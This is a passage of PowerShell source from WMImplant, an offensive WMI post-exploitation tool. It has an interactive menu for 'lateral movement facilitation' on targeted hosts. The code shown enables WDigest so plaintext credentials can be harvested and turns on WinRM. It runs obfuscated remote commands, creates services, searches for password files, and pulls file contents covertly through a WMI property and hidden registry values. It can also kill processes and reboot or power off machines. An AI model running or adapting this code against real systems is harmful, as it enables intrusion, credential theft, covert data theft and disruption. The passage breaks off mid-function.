                    Invoke-RegValueMod -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -ComputerName $Computer
                }
            }
        }

        elseif($DisableWinRM)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-ProcSpawn -Credential $RemoteCredential -ComputerName $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
                }

                else
                {
                    Invoke-ProcSpawn -ComputerName $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
                }
            }
        }

        elseif($EnableWdigest)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-RegValueMod -Credential $RemoteCredential -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue 1 -ComputerName $Computer
                }

                else
                {
                    Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue 1 -ComputerName $Computer
                }
            }
        }

        elseif($EnableWinRM)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-ProcSpawn -Credential $RemoteCredential -ComputerName $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
                }

                else
                {
                    Invoke-ProcSpawn -ComputerName $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
                }
            }
        }

        elseif($KeyCreate)
        {
            if(!$RegHive)
            {
                Throw "You need to specify either [hklm] or [hkcu] for the registry value to use!"
            }

            if(!$RegKey)
            {
                Throw "You need to specify the registry key you will add or remove a value from!"
            }

            if(!$RegSubKey)
            {
                Throw "You need to specify the registry sub key you will add or remove a value from!"
            }

            if(!$RegValue)
            {
                Throw "Please provide the registry value you are looking to modify!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-RegValueMod -ComputerName $Computer -Credential $RemoteCredential -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey -RegValue $RegValue
                }
                else
                {
                    Invoke-RegValueMod -ComputerName $Computer -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey -RegValue $RegValue
                }
            }
        }

        elseif($KeyDelete)
        {
            if(!$RegHive)
            {
                Throw "You need to specify either [hklm] or [hkcu] for the registry value to use!"
            }

            if(!$RegKey)
            {
                Throw "You need to specify the registry key you will remove a value from!"
            }

            if(!$RegSubKey)
            {
                Throw "Please provide the registry sub key you are looking to delete!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-RegValueMod -ComputerName $Computer -Credential $RemoteCredential -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey
                }
                else
                {
                    Invoke-RegValueMod -ComputerName $Computer -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey
                }
            }
        }

        elseif($RemotePosh)
        {
            if(!$Location)
            {
                Throw "You need to specify the Location flag to provide the file location where the script is!"
            }

            if(!$Function)
            {
                Throw "You need to specify the Function flag to provide the function to run on the remote system!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-RemoteScriptWithOutput -Credential $RemoteCredential -Location $Location -Function $Function -ComputerName $Computer
                }

                else
                {
                    Invoke-RemoteScriptWithOutput -Location $Location -Function $Function -ComputerName $Computer
                }
            }
        }

        elseif($ServiceStart)
        {
            if(!$ServiceName)
            {
                Throw "You need to specify the service name you want to start!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-ServiceMod -Credential $RemoteCredential -ComputerName $Computer -Service $ServiceName -Start
                }
                else
                {
                    Invoke-ServiceMod -ComputerName $Computer -Service $ServiceName -Start
                }
            }
        }

        elseif($ServiceStop)
        {
            if(!$ServiceName)
            {
                Throw "You need to specify the service name you want to stop!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-ServiceMod -Credential $RemoteCredential -ComputerName $Computer -Service $ServiceName -Stop
                }
                else
                {
                    Invoke-ServiceMod -ComputerName $Computer -Service $ServiceName -Stop
                }
            }
        }

        elseif($ServiceDelete)
        {
            if(!$ServiceName)
            {
                Throw "You need to specify the service name you want to delete!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-ServiceMod -Credential $RemoteCredential -ComputerName $Computer -Service $ServiceName -Delete
                }
                else
                {
                    Invoke-ServiceMod -ComputerName $Computer -Service $ServiceName -Delete
                }
            }
        }

        elseif($ServiceCreate)
        {
            if(!$ServiceName)
            {
                Throw "You need to specify the service name you want to create!"
            }

            if(!$RemoteFile)
            {
                Throw "You need to specify the path to the service binary for the service you are creating!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-ServiceMod -Credential $RemoteCredential -ComputerName $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
                }
                else
                {
                    Invoke-ServiceMod -ComputerName $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
                }
            }
        }
    

        elseif($SetWMIDefault)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Set-OriginalProperty -Credential $RemoteCredential -ComputerName $Computer
                }

                else
                {
                    Set-OriginalProperty -ComputerName $Computer
                }
            }
        }

        elseif($PS)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Get-ProcessListingWMImplant -Credential $RemoteCredential -ComputerName $Computer
                }

                else
                {
                    Get-ProcessListingWMImplant -ComputerName $Computer
                }
            }
        }

        elseif($ProcessKill)
        {
            if(!$ProcessName -and !$ProcessID)
            {
                Throw "Please provide the ProcessID or ProcessName flag to specify the process to kill!"
            }

            Foreach($Computer in $ComputerName)
            {

                if($RemoteCredential)
                {
                    if($ProcessName)
                    {
                        Invoke-ProcessPunisher -Credential $RemoteCredential -ComputerName $Computer -PName $ProcessName
                    }

                    elseif($ProcessID)
                    {
                        Invoke-ProcessPunisher -Credential $RemoteCredential -ComputerName $Computer -ProcId $ProcessID
                    }
                }

                else
                {
                    if($ProcessName)
                    {
                        Invoke-ProcessPunisher -ComputerName $Computer -PName $ProcessName
                    }

                    elseif($ProcessID)
                    {
                        Invoke-ProcessPunisher -ComputerName $Computer -ProcId $ProcessID
                    }
                }
            }
        }

        elseif($ProcessStart)
        {
            if(!$RemoteFile)
            {
                Throw "You need to specify the RemoteFile flag to provide a file/command to run!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-ProcSpawn -Credential $RemoteCredential -ComputerName $Computer -Command $RemoteFile
                }

                else
                {
                    Invoke-ProcSpawn -ComputerName $Computer -Command $RemoteFile
                }
            }
        }

        elseif($ActiveUsers)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Find-CurrentUsers -Credential $RemoteCredential -ComputerName $Computer
                }

                else
                {
                    Find-CurrentUsers -ComputerName $Computer
                }
            }
        }

        elseif($BasicInfo)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Get-HostInfo -Credential $RemoteCredential -ComputerName $Computer
                }

                else
                {
                    Get-HostInfo -ComputerName $Computer
                }
            }
        }

        elseif($DriveList)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Get-ComputerDrives -Credential $RemoteCredential -ComputerName $Computer
                }

                else
                {
                    Get-ComputerDrives -ComputerName $Computer
                }
            }
        }

        elseif($IFConfig)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Get-NetworkCards -Credential $RemoteCredential -ComputerName $Computer
                }

                else
                {
                    Get-NetworkCards -ComputerName $Computer
                }
            }
        }

        elseif($InstalledPrograms)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Get-InstalledPrograms -Credential $RemoteCredential -ComputerName $Computer
                }

                else
                {
                    Get-InstalledPrograms -ComputerName $Computer
                }
            }
        }

        elseif($VacantSystem)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Find-VacantComputer -Credential $RemoteCredential -ComputerName $Computer
                }

                else
                {
                    Find-VacantComputer -ComputerName $Computer
                }
            }
        }

        elseif($LogonEvents)
        {
            Foreach($Computer in $ComputerName)
            {
                if($LocalFile)
                {
                    if($RemoteCredential)
                    {
                        Get-WMIEventLogins -Credential $RemoteCredential -ComputerName $Computer -FileName $LocalFile
                    }

                    else
                    {
                        Get-WMIEventLogins -ComputerName $Computer -FileName $LocalFile
                    }
                }

                else
                {
                    if($RemoteCredential)
                    {
                        Get-WMIEventLogins -Credential $RemoteCredential -ComputerName $Computer
                    }

                    else
                    {
                        Get-WMIEventLogins -ComputerName $Computer
                    }
                }
            }
        }

        elseif($LogOff)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-PowerOptionsWMI -Credential $RemoteCredential -ComputerName $Computer -Logoff
                }

                else
                {
                    Invoke-PowerOptionsWMI -ComputerName $Computer -Logoff
                }
            }
        }

        elseif($Reboot)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-PowerOptionsWMI -Credential $RemoteCredential -ComputerName $Computer -Reboot
                }

                else
                {
                    Invoke-PowerOptionsWMI -ComputerName $Computer -Reboot
                }
            }
        }

        elseif($PowerOff)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-PowerOptionsWMI -Credential $RemoteCredential -ComputerName $Computer -Shutdown
                }

                else
                {
                    Invoke-PowerOptionsWMI -ComputerName $Computer -Shutdown
                }
            }
        }

        elseif($ListCommands)
        {
            Show-WMImplantMainMenu
        }

        elseif($Interactive)
        {
            Show-WMImplantMainMenu
            Use-MenuSelection
        }

        # I don't believe this should ever execute
        else
        {
            Show-WMImplantMainMenu
            Use-MenuSelection
        }
    }
}

function Select-UserAccount
{
    # Query user for user account and password to use
    $UserUsername = Read-Host "Please provide the domain\username to use for authentication >"
    $UserPassword = Read-Host "Please provide the password to use for authentication >"

    # This block of code is executed when starting a process on a remote machine via wmi
    $ChangedPassword = ConvertTo-SecureString $UserPassword -asplaintext -force 
    $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $UserUsername,$ChangedPassword
    return $cred
}

function Show-WMImplantMainMenu
{
    # Print out commands available to the user
    $menu_options = "`nWMImplant Main Menu:`n`n"

    $menu_options += "Meta Functions:`n"
    $menu_options += "====================================================================`n"
    $menu_options += "change_user - Change the user used to connect to remote systems`n"
    $menu_options += "exit - Exit WMImplant`n"
    $menu_options += "gen_cli - Generate the CLI command to execute a command via WMImplant`n"
    $menu_options += "set_default - Set default value of DebugFilePath property`n"
    $menu_options += "help - Display this help/command menu`n`n"

    $menu_options += "File Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "cat - Attempt to read a file's contents`n"
    $menu_options += "copy - Copy a file from one location to another`n"
    $menu_options += "delete - delete a file from the targeted system`n"
    $menu_options += "download - Download a file from a remote machine`n"
    $menu_options += "ls - File/Directory listing of a specific directory`n"
    $menu_options += "search - Search for a file on a user-specified drive`n"
    $menu_options += "upload - Upload a file to a remote machine`n`n"

    $menu_options += "Lateral Movement Facilitation`n"
    $menu_options += "====================================================================`n"
    $menu_options += "command_exec - Run a command line command and get the output`n"
    $menu_options += "disable_wdigest - Remove registry value UseLogonCredential`n"
    $menu_options += "disable_winrm - Disable WinRM on the targeted host`n"
    $menu_options += "enable_wdigest - Add registry value UseLogonCredential`n"
    $menu_options += "enable_winrm - Enable WinRM on a targeted host`n"
    $menu_options += "registry_mod - Modify the registry on the targeted system`n"
    $menu_options += "remote_posh - Run a PowerShell script on a system and receive output`n"
    $menu_options += "service_mod - Create, delete, or modify services`n`n"

    $menu_options += "Process Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "process_kill - Kill a specific process`n"
    $menu_options += "process_start - Start a process on a remote machine`n"
    $menu_options += "ps - Process listing`n`n"
    
    $menu_options += "System Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "active_users - List domain users with active processes on a system`n"
    $menu_options += "basic_info - Gather hostname and other basic system info`n"
    $menu_options += "drive_list - List local and network drives`n"
    $menu_options += "ifconfig - IP information for NICs with IP addresses`n"
    $menu_options += "installed_programs - Receive a list of all programs installed`n"
    $menu_options += "logoff - Logs users off the specified system`n"
    $menu_options += "reboot - Reboot a system`n"
    $menu_options += "power_off - Power off a system`n"
    $menu_options += "vacant_system - Determine if a user is away from the system.`n`n"

    $menu_options += "Log Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "logon_events - Identify users that have logged into a system`n`n"

    # Print the menu out to the user
    $menu_options
}

function Use-MenuSelection
{
    # This function is where the user provides the command they wish to execute
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential
    )

    $looping = $true
    while ($looping)
    {

        # Read in user's menu choice
        $menu_selection = Read-Host "Command >"
        $menu_selection = $menu_selection.Trim().ToLower()

        if(($menu_selection -ne 'exit') -and ($menu_selection -ne 'change_user') -and ($menu_selection -ne 'help'))
        {
            $ComputerName = Read-Host "What system are you targeting? >"
            $ComputerName = $ComputerName.Trim()
        }

        switch ($menu_selection)
        {
            "change_user"
            {
                $Credential = Select-UserAccount
            }

            "exit"
            {
                $looping = $false
            }

            "gen_cli"
            {
                Invoke-CommandGeneration -ComputerName $ComputerName
            }

            "set_default"
            {
                if ($Credential)
                {
                    Set-OriginalProperty -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Set-OriginalProperty -ComputerName $ComputerName
                }
            }

            "help"
            {
                Show-WMImplantMainMenu
            }

            "cat"
            {
                if ($Credential)
                {
                    Get-FileContentsWMImplant -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Get-FileContentsWMImplant -ComputerName $ComputerName
                }
            }

            "copy"
            {
                if($Credential)
                {
                    Edit-FileWMI -Copy -Credential $Credential -ComputerName $ComputerName
                }
                else
                {
                    Edit-FileWMI -Copy -ComputerName $ComputerName
                }
            }

            "delete"
            {
                if($Credential)
                {
                    Edit-FileWMI -Delete -Credential $Credential -ComputerName $ComputerName
                }
                else
                {
                    Edit-FileWMI -Delete -ComputerName $ComputerName
                }
            }

            "download"
            {
                if ($Credential)
                {
                    Invoke-FileTransferWMImplant -Credential $Credential -Download -ComputerName $ComputerName
                }

                else
                {
                    Invoke-FileTransferWMImplant -Download -ComputerName $ComputerName
                }
            }

            "ls"
            {
                if ($Credential)
                {
                    Invoke-LSWMImplant -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Invoke-LSWMImplant -ComputerName $ComputerName
                }
            }

            "search"
            {
                if($Credential)
                {
                    Find-FileWMImplant -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Find-FileWMImplant -ComputerName $ComputerName
                }

            }

            "upload"
            {
                if ($Credential)
                {
                    Invoke-FileTransferWMImplant -Credential $Credential -Upload -ComputerName $ComputerName
                }

                else
                {
                    Invoke-FileTransferWMImplant -Upload -ComputerName $ComputerName
                }
            }

            "command_exec"
            {
                if ($Credential)
                {
                    Invoke-CommandExecution -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Invoke-CommandExecution -ComputerName $ComputerName
                }
            }

            "disable_wdigest"
            {
                if ($Credential)
                {
                    Invoke-RegValueMod -Credential $Credential -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -ComputerName $ComputerName
                }

                else
                {
                    Invoke-RegValueMod -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -ComputerName $ComputerName
                }
            }

            "disable_winrm"
            {
                if ($Credential)
                {
                    Invoke-ProcSpawn -Credential $Credential -Command 'powershell.exe -command "Disable-PSRemoting -Force"' -ComputerName $ComputerName
                }

                else
                {
                    Invoke-ProcSpawn -Command 'powershell.exe -command "Disable-PSRemoting -Force"' -ComputerName $ComputerName
                }
            }

            "enable_wdigest"
            {
                if ($Credential)
                {
                    Invoke-RegValueMod -Credential $Credential -KeyCreate -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue '0x1' -ComputerName $ComputerName
                }

                else
                {
                    Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey UseLogonCredential -RegValue "0x1" -ComputerName $ComputerName
                }
            }

            "enable_winrm"
            {
                if ($Credential)
                {
                    Invoke-ProcSpawn -Credential $Credential -Command 'powershell.exe -command "Enable-PSRemoting -Force"' -ComputerName $ComputerName
                }

                else
                {
                    Invoke-ProcSpawn -Command 'powershell.exe -command "Enable-PSRemoting -Force"' -ComputerName $ComputerName
                }
            }

            "registry_mod"
            {
                if($Credential)
                {
                    Invoke-RegValueMod -Credential $Credential -ComputerName $ComputerName
                }
                else
                {
                    Invoke-RegValueMod -ComputerName $ComputerName
                }
            }

            "remote_posh"
            {
                if ($Credential)
                {
                    Invoke-RemoteScriptWithOutput -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Invoke-RemoteScriptWithOutput -ComputerName $ComputerName
                }
            }

            "service_mod"
            {
                if($Credential)
                {
                    Invoke-ServiceMod -Credential $Credential -ComputerName $ComputerName
                }
                else
                {
                    Invoke-ServiceMod -ComputerName $ComputerName
                }
            }

            "process_kill"
            {
                if ($Credential)
                {
                    Invoke-ProcessPunisher -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Invoke-ProcessPunisher -ComputerName $ComputerName
                }
            }

            "process_start"
            {
                if ($Credential)
                {
                    Invoke-ProcSpawn -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Invoke-ProcSpawn -ComputerName $ComputerName
                }
            }

            "ps"
            {
                if ($Credential)
                {
                    Get-ProcessListingWMImplant -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Get-ProcessListingWMImplant -ComputerName $ComputerName
                }
            }

            "active_users"
            {
                if($Credential)
                {
                    Find-CurrentUsers -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Find-CurrentUsers -ComputerName $ComputerName
                }
            }

            "basic_info"
            {
                if($Credential)
                {
                    Get-HostInfo -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Get-HostInfo -ComputerName $ComputerName
                }
            }

            "drive_list"
            {
                if($Credential)
                {
                    Get-ComputerDrives -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Get-ComputerDrives -ComputerName $ComputerName
                }
            }

            "ifconfig"
            {
                if($Credential)
                {
                    Get-NetworkCards -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Get-NetworkCards -ComputerName $ComputerName
                }
            }

            "installed_programs"
            {
                if($Credential)
                {
                    Get-InstalledPrograms -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Get-InstalledPrograms -ComputerName $ComputerName
                }
            }

            "logon_events"
            {
                $FileSave = Read-Host "Do you want to save the log information to a file? [yes/no] >"
                $FileSave = $FileSave.Trim().ToLower()

                if(($FileSave -eq "y") -or ($FileSave -eq "yes"))
                {
                    $FileSavePath = Read-Host "What is the full path to where the file should be saved? >"
                    $FileSavePath = $FileSavePath.Trim()

                    if($Credential)
                    {
                        Get-WMIEventLogins -Credential $Credential -FileName $FileSavePath -ComputerName $ComputerName
                    }

                    else
                    {
                        Get-WMIEventLogins -FileName $FileSavePath -ComputerName $ComputerName
                    }
                }

                else
                {
                    if($Credential)
                    {
                        Get-WMIEventLogins -Credential $Credential -ComputerName $ComputerName
                    }

                    else
                    {
                        Get-WMIEventLogins -ComputerName $ComputerName
                    }
                }
            }

            "logoff"
            {
                if($Credential)
                {
                    Invoke-PowerOptionsWMI -Credential $Credential -Logoff -ComputerName $ComputerName
                }

                else
                {
                    Invoke-PowerOptionsWMI -Logoff -ComputerName $ComputerName
                }
            }

            "reboot"
            {
                if($Credential)
                {
                    Invoke-PowerOptionsWMI -Credential $Credential -Reboot -ComputerName $ComputerName
                }

                else
                {
                    Invoke-PowerOptionsWMI -Reboot -ComputerName $ComputerName
                }
            }

            "power_off"
            {
                if($Credential)
                {
                    Invoke-PowerOptionsWMI -Credential $Credential -Shutdown -ComputerName $ComputerName
                }

                else
                {
                    Invoke-PowerOptionsWMI -Shutdown -ComputerName $ComputerName
                }
            }

            "vacant_system"
            {
                if($Credential)
                {
                    Find-VacantComputer -Credential $Credential -ComputerName $ComputerName
                }
                else
                {
                    Find-VacantComputer -ComputerName $ComputerName
                }
            }

            default
            {
                Write-Output "You did not select a valid command! Please try again!"
            }
        } #End of switch
    } # End of while loop
} # End of function

function Find-FileWMImplant
{
    # This function enables a user to search for a file name or extension on the
    # targeted computer
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)]
        [string]$File,
        [Parameter(Mandatory = $False)]
        [string]$Drive,
        [Parameter(Mandatory = $False, ParameterSetName='extension')] 
        [string]$Extension
    )

    process
    {
        if(!$Drive)
        {
            $Drive = Read-Host "What drive do you want to search? (Ex: C:) >"
            $Drive = $Drive.Trim()
        }

        # Check length of drive, only want first two characters
        if($Drive.length -gt 2)
        {
            $Drive = $Drive.substring(0,2)
        }

        elseif($Drive.length -lt 2)
        {
            Throw "Drive needs two character EX: C:"
        }

        if(!$File -and !$Extension)
        {
            $Search_Target = Read-Host "Do you want to search for a [file] or file [extension]? >"
            $Search_Target = $Search_Target.Trim().ToLower()

            if($Search_Target -eq "file")
            {
                $File = Read-Host "What file do you want to search for? (Ex: pass.txt or *ssword.txt) >"
                $File = $File.Trim().ToLower()
            }
            elseif($Search_Target -eq "extension")
            {
                $Extension = Read-Host "What file extension do you want to search for? (Ex: sql) >"
                $Extension = $Extension.Trim().ToLower()
            }
            else
            {
                Throw "You need to search for either a file or file extension!"
            }
        }

        # If searching for a file and not a file extension
        if($File)
        {
            $counter = 0
            $filter = "Filename"
            foreach($incoming_file in $File)
            {
                if($counter -gt 0)
                {
                    $filter += "OR Filename"
                }

                if($incoming_file.Contains("."))
                {
                    #get the index of the last .
                    $index = $incoming_file.LastIndexOf(".")
                    #get the first part of the name
                    $filename = $incoming_file.Substring(0,$index)
                    #get the last part of the name
                    $extension = $incoming_file.Substring($index+1)

                    if($filename -match "\*")
                    {
                        $filename = $filename.Replace("*","%")
                        $filter += " LIKE '$filename' "
                    }
                    else
                    {
                        $filter += " = '$filename' "
                    }

                    if ($extension -match "\*")
                    {
                        $extension = $extension.Replace("*","%")
                        $filter += "AND Extension LIKE '$extension' "
                    }
                    else 
                    {
                        $filter += "AND Extension = '$extension' "
                    }
                    
                }
                else
                {
                    if($incoming_file -match "\*")
                    {
                        $filename = $incoming_file.Replace("*","%")
                        $filter += " LIKE '$filename' "
                    }
                    else
                    {
                        $filter += " = '$incoming_file' "
                    }
                }
                $counter += 1
            }
        }

        # If searching by extension
        elseif($Extension)
        {
            $counter = 0
            $filter = "Extension"
            foreach($ext in $Extension)
            {
                if($counter -gt 0)
                {
                    $filter += "OR Extension"
                }

                if ($ext -match "\*")
                {
                    $ext = $ext.Replace("*","%")
                    $filter += " LIKE '$ext' "
                }
                else 
                {
                    $filter += " = '$ext' "
                }
                $counter += 1
            }
        }

        $filter += "AND Drive='$Drive'"

        if($Credential)
        {
            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $ComputerName -Credential $Credential
        }
        else
        {
            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $ComputerName
        }
    }
}

function Get-FileContentsWMImplant
{
    # This function reads and displays the contents of a user-specified file on the targeted machine to the console
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)]
        [string]$File
    )

    Process
    {
        if(!$File)
        {
            $File = Read-Host "What's the full path to the file you'd like to view? >"
            $File = $File.Trim()
        }

        # Keep original WMI Property Value
        if($Credential)
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential).DebugFilePath
        }
        else
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName).DebugFilePath
        }

        # On remote system, save file to registry
        Write-Verbose "Reading remote file and writing to WMI property"
        $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [Int[]][Char[]]$fct -Join '',''; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $fctenc; $a.Put()'

        if($Credential)
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
        }
        else
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
        }

        # Poll remote system, and determine if the script is done
        # If not, sleep and poll again
        $quit = $false
        while($quit -eq $false)
        {
            Write-Verbose "Polling property to see if the script has completed"
            if($Credential)
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
            }
            else
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName
            }
            
            try 
            {
                if($Original_WMIProperty -match  $modified_WMIObject.DebugFilePath)
                {
                    Write-Verbose "Script is not done, sleeping for 5 and trying again"
                    Start-Sleep -s 5
                }
                else 
                {
                    Write-Verbose "Script is complete, pulling data now"
                    $quit = $true
                }
            }
            catch
            {
                Write-Verbose "Script is not done, sleeping for 5 and trying again"
                Start-Sleep -s 5
            }
        }
    
        $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
        # Print to console
        $decode

        # Removing Registry value from remote system
        Write-Verbose "Replacing property on remote system"

        $modified_WMIObject.DebugFilePath = $Original_WMIProperty
        $null = $modified_WMIObject.Put()

        Write-Verbose "Done!"
    }
    end{}
}

function Invoke-FileTransferWMImplant
{
    # This function enables the user to upload or download files to/from the attacking machine to/from the targeted machine
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False,ParameterSetName='download')]
        [switch]$Download,
        [Parameter(Mandatory = $False,ParameterSetName='upload')]
        [switch]$Upload,
        [Parameter(Mandatory = $False)]
        [string]$DownloadFile,
        [Parameter(Mandatory = $False)]
        [string]$DownloadFilePath,
        [Parameter(Mandatory = $False)]
        [string]$UploadFile,
        [Parameter(Mandatory = $False)]
        [string]$UploadFilePath
    )

    Process
    {
        # invoke powershell on both remote and local system.  Both will connect back over WMI to retrieve file contents
        # applies to both download and upload operations.
        # Uses HKLM/Software/Microsoft
        #2147483650 - hklm, 2147483649 - kkcu, 

        Write-Verbose "Creating registry key to store data"
        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
        $registryupname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        # The reghive value is for hkey_local_machine
        $reghive = 2147483650
        $regpath = "SOFTWARE\Microsoft\Windows"
        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name

        if($Download)
        {
            if(!$DownloadFile)
            {
                $Download_File = Read-Host "What's the full path to the file you'd like to download? >"
                $Download_File = $Download_File.Trim()
            }
            else
            {
                $Download_File = $DownloadFile
            }

            if(!$DownloadFilePath)
            {
                $Download_File_Path = Read-Host "What's the full path to location you'd like to save the file locally? >"
                $Download_File_Path = $Download_File_Path.Trim()
            }
            else
            {
                $Download_File_Path = $DownloadFilePath
            }

            # On remote system, save file to registry
            Write-Verbose "Reading remote file and writing on remote registry"
            $remote_command = '$fct = Get-Content -Encoding byte -ReadCount 0 -Path ''' + "$Download_file" + '''; $fctenc = [Int[]][byte[]]$fct -Join '',''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'

            if($Credential)
            {
                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
            }
            else
            {
                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
            }

            # Start the polling process to see if the file is stored in the registry
            # Grab file from remote system's registry
            Write-Verbose "Checking if file is in the remote system's registry"
            $quit = $false
            while($quit -eq $false)
            {
                if($Credential)
                {
                    $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $ComputerName -Credential $Credential
                }
                else
                {
                    $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $ComputerName
                }
                if($remote_reg.ReturnValue -ne 0)
                {
                    Write-Verbose "File not doing being stored in registry, sleeping for 5..."
                    Start-Sleep -s 5
                }
                else 
                {
                    $quit = $true
                }
            }
            
            $decode = [byte[]][int[]]$remote_reg.sValue.Split(',') -Join ' '
            [byte[]] $decoded = $decode -split ' '
